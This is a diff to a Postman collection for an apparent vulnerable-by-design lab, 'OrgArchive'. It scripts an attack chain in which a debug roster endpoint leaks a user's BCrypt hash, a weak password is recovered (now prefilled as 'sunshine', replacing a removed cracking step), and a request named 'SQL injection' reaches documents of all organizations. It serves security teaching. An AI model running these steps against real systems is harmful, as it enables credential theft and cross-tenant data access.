@@ -1,7 +1,7 @@
 {
   "info": {
     "name": "OrgArchive — signup to cross-organization document access",
-    "description": "Run in order. After request 8, recover Bob’s password offline from bobHash and set bobPassword locally.",
+    "description": "Run in order. Anna uses a deliberately weak lab password. The password is already stored in the collection variable annaPassword; explain its offline match to the leaked BCrypt hash without a live cracking step.",
     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
   },
   "variable": [
@@ -22,12 +22,12 @@
       "value": ""
     },
     {
-      "key": "bobHash",
+      "key": "annaHash",
       "value": ""
     },
     {
-      "key": "bobPassword",
-      "value": ""
+      "key": "annaPassword",
+      "value": "sunshine"
     }
   ],
   "item": [
@@ -250,7 +250,7 @@
             "type": "text/javascript",
             "exec": [
               "pm.response.to.have.status(200);",
-              "pm.expect(pm.response.json().some(u => u.username === 'bob')).to.be.true;",
+              "pm.expect(pm.response.json().some(u => u.username === 'anna')).to.be.true;",
               "pm.expect(pm.response.text()).not.to.include('passwordHash');"
             ]
           }
@@ -258,11 +258,11 @@
       ]
     },
     {
-      "name": "8 · Admin debug roster → Bob hash",
+      "name": "8 · Admin debug roster → Anna hash",
       "request": {
         "method": "GET",
         "url": "{{gatewayUrl}}/users?debug=true",
-        "description": "Copy bobHash into solve/crack_bob.py, then set bobPassword locally. The attacker remains a normal user.",
+        "description": "Save Anna’s BCrypt hash in annaHash for the explanation. annaPassword is a prefilled lab fixture (sunshine); no password cracking runs in Postman.",
         "auth": {
           "type": "basic",
           "basic": [
@@ -286,9 +286,9 @@
             "type": "text/javascript",
             "exec": [
               "pm.response.to.have.status(200);",
-              "const bob = pm.response.json().find(u => u.username === 'bob');",
-              "pm.expect(bob.passwordHash).to.match(/^\\$2[aby]\\$/);",
-              "pm.collectionVariables.set('bobHash', bob.passwordHash);"
+              "const anna = pm.response.json().find(u => u.username === 'anna');",
+              "pm.expect(anna.passwordHash).to.match(/^\\$2[aby]\\$/);",
+              "pm.collectionVariables.set('annaHash', anna.passwordHash);"
             ]
           }
         }
@@ -298,7 +298,7 @@
       "name": "9 · Direct admin user lookup → 403",
       "request": {
         "method": "GET",
-        "url": "{{gatewayUrl}}/users/bob",
+        "url": "{{gatewayUrl}}/users/anna",
         "description": "A directly annotated admin method remains protected; the visitor did not gain an admin role.",
         "auth": {
           "type": "basic",
@@ -329,115 +329,7 @@
       ]
     },
     {
-      "name": "10 · Bob sees Atlas notes",
-      "request": {
-        "method": "GET",
-        "url": "{{gatewayUrl}}/notes",
-        "description": "",
-        "auth": {
-          "type": "basic",
-          "basic": [
-            {
-              "key": "username",
-              "value": "bob",
-              "type": "string"
-            },
-            {
-              "key": "password",
-              "value": "{{bobPassword}}",
-              "type": "string"
-            }
-          ]
-        }
-      },
-      "event": [
-        {
-          "listen": "test",
-          "script": {
-            "type": "text/javascript",
-            "exec": [
-              "pm.response.to.have.status(200);",
-              "const notes = pm.response.json();",
-              "pm.expect(notes.some(n => n.title === 'Report index')).to.be.true;",
-              "pm.collectionVariables.set('atlasNotes', JSON.stringify(notes));"
-            ]
-          }
-        }
-      ]
-    },
-    {
-      "name": "11 · Maija sees same notes",
-      "request": {
-        "method": "GET",
-        "url": "{{gatewayUrl}}/notes",
-        "description": "",
-        "auth": {
-          "type": "basic",
-          "basic": [
-            {
-              "key": "username",
-              "value": "m.lehtinen",
-              "type": "string"
-            },
-            {
-              "key": "password",
-              "value": "d5jW#9pqL!2zX",
-              "type": "string"
-            }
-          ]
-        }
-      },
-      "event": [
-        {
-          "listen": "test",
-          "script": {
-            "type": "text/javascript",
-            "exec": [
-              "pm.response.to.have.status(200);",
-              "pm.expect(JSON.stringify(pm.response.json())).to.equal(pm.collectionVariables.get('atlasNotes'));"
-            ]
-          }
-        }
-      ]
-    },
-    {
-      "name": "12 · Harbor user sees different notes",
-      "request": {
-        "method": "GET",
-        "url": "{{gatewayUrl}}/notes",
-        "description": "",
-        "auth": {
-          "type": "basic",
-          "basic": [
-            {
-              "key": "username",
-              "value": "r.dubois",
-              "type": "string"
-            },
-            {
-              "key": "password",
-              "value": "Tr0ub4dor&3xZ!",
-              "type": "string"
-            }
-          ]
-        }
-      },
-      "event": [
-        {
-          "listen": "test",
-          "script": {
-            "type": "text/javascript",
-            "exec": [
-              "pm.response.to.have.status(200);",
-              "pm.expect(pm.response.json().some(n => n.title === 'Fuel review')).to.be.true;",
-              "pm.expect(pm.response.json().some(n => n.title === 'Report index')).to.be.false;"
-            ]
-          }
-        }
-      ]
-    },
-    {
-      "name": "13 · Normal Atlas document search",
+      "name": "10 · Normal Atlas document search",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -447,12 +339,12 @@
           "basic": [
             {
               "key": "username",
-              "value": "bob",
+              "value": "anna",
               "type": "string"
             },
             {
               "key": "password",
-              "value": "{{bobPassword}}",
+              "value": "{{annaPassword}}",
               "type": "string"
             }
           ]
@@ -489,7 +381,7 @@
       ]
     },
     {
-      "name": "14 · Foreign organization search → empty",
+      "name": "11 · Foreign organization search → empty",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -499,12 +391,12 @@
           "basic": [
             {
               "key": "username",
-              "value": "bob",
+              "value": "anna",
               "type": "string"
             },
             {
               "key": "password",
-              "value": "{{bobPassword}}",
+              "value": "{{annaPassword}}",
               "type": "string"
             }
           ]
@@ -539,7 +431,7 @@
       ]
     },
     {
-      "name": "15 · SQL injection → all organizations",
+      "name": "12 · SQL injection → all organizations",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search",
@@ -549,12 +441,12 @@
           "basic": [
             {
               "key": "username",
-              "value": "bob",
+              "value": "anna",
               "type": "string"
             },
             {
               "key": "password",
-              "value": "{{bobPassword}}",
+              "value": "{{annaPassword}}",
               "type": "string"
             }
           ]
@@ -591,7 +483,7 @@
       ]
     },
     {
-      "name": "16 · Safe query → empty",
+      "name": "13 · Safe query → empty",
       "request": {
         "method": "POST",
         "url": "{{gatewayUrl}}/documents/search-safe",
@@ -601,12 +493,12 @@
           "basic": [
             {
               "key": "username",
-              "value": "bob",
+              "value": "anna",
               "type": "string"
             },
             {
               "key": "password",
-              "value": "{{bobPassword}}",
+              "value": "{{annaPassword}}",
               "type": "string"
             }
           ]
